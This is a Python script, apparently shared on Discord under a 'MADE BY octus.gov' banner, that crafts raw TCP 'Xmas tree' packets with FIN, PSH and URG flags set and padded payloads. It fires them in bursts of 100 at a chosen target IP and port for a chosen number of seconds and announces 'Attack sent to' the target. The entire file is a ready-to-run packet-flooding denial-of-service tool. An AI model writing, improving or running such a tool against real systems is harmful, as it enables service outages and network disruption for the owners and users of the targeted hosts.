import socket
import struct
import random
import time
import sys

def create_xmas_packet(src_ip, target, target_port, packet_size):
    """Create an Xmas tree packet with a specified packet size."""
    src_port = random.randint(1024, 65535)
    
    # IP header length is 20 bytes, TCP header is 20 bytes
    total_header_size = 20 + 20
    payload_size = max(0, packet_size - total_header_size)
    
    # Create a dummy payload to meet the packet size requirement
    payload = b'A' * payload_size

    ip_header = struct.pack('!BBHHHBBH4s4s',
        0x45,             # IP version and header length
        0,                # Type of service
        total_header_size + len(payload),  # Total length (header + payload)
        0,                # Identification
        0,                # Flags and fragment offset
        64,               # Time to live (TTL)
        socket.IPPROTO_TCP,  # Protocol (TCP)
        0,                # Checksum (initial, set later)
        socket.inet_aton(src_ip),  # Source IP address
        socket.inet_aton(target))  # Destination IP address

    tcp_header = struct.pack('!HHLLBBHHH',
        src_port,        # Source port
        target_port,        # Destination port
        0,               # Sequence number
        0,               # Acknowledgment number
        5 << 4,          # Data offset (5 words, no options)
        0b00111000,      # Xmas flags (FIN, PSH, URG)
        0,               # Window size
        0,               # Checksum (initial, set later)
        0                # Urgent pointer
    )

    pseudo_header = struct.pack('!4s4sBBH',
        socket.inet_aton(src_ip),
        socket.inet_aton(target),
        0,
        socket.IPPROTO_TCP,
        len(tcp_header) + len(payload)
    )

    def checksum(data):
        s = 0
        # Process data in 16-bit chunks
        for i in range(0, len(data) - 1, 2):
            w = (data[i] << 8) + (data[i+1])
            s += w
        # Handle odd-length data
        if len(data) % 2:
            s += (data[-1] << 8)
        # Add overflow bits
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff


    ip_checksum = checksum(ip_header)
    tcp_checksum = checksum(pseudo_header + tcp_header + payload)

    # Repack the headers with the correct checksums
    ip_header = struct.pack('!BBHHHBBH4s4s',
        0x45, 
        0, 
        total_header_size + len(payload), 
        0, 
        0, 
        64, 
        socket.IPPROTO_TCP, 
        ip_checksum, 
        socket.inet_aton(src_ip), 
        socket.inet_aton(target))
    
    tcp_header = struct.pack('!HHLLBBHHH',
        src_port, 
        target_port, 
        0, 
        0, 
        5 << 4, 
        0b00111000, 
        0, 
        tcp_checksum, 
        0)

    # Packet = IP header + TCP header + Payload
    packet = ip_header + tcp_header + payload
    return packet

def get_public_ip():
    """Get the public IP of the local machine."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.connect(("8.8.8.8", 80))  # Use a public DNS server
        return s.getsockname()[0]

def xmas_start(target, target_port, packet_size_range, duration):
    """Send Xmas tree packets with a specified packet size range for the set duration."""
    src_ip = get_public_ip()
    end_time = time.time() + duration

    # Check if packet_size_range is a range or a single size
    if '-' in packet_size_range:
        min_size, max_size = map(int, packet_size_range.split('-'))
        if min_size > max_size:
            raise ValueError("Minimum packet size should not be greater than maximum packet size.")
    else:
        min_size = max_size = int(packet_size_range)
    
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        while time.time() < end_time:
            # Randomize the packet size if it's a range
            packet_size = random.randint(min_size, max_size)
            packet = create_xmas_packet(src_ip, target, target_port, packet_size)

            for _ in range(100):
                try:
                    s.sendto(packet, (target, 0))
                except Exception as e:
                    print(f"Failed to send packet: {e}")

def print_usage():
    """Prints the usage message for the script."""
    print("usage: xmas.py <target> <target_port> <packet_size> <duration>")
if __name__ == "__main__":
    if len(sys.argv) != 5:
        print_usage()
        sys.exit(1)
    
    target = sys.argv[1]
    try:
        target_port = int(sys.argv[2])
        packet_size = sys.argv[3]
        duration = int(sys.argv[4])
    except ValueError:
        print_usage()
        sys.exit(1)

    try:
        print(f"")
        print(f"                    MADE BY octus.gov on discord")
        print(f"Attack sent to {target}:{target_port} with packet size {packet_size} for {duration} seconds.")
        xmas_start(target, target_port, packet_size, duration)
    except ValueError as e:
        print(f"Error: {e}")
        sys.exit(1)
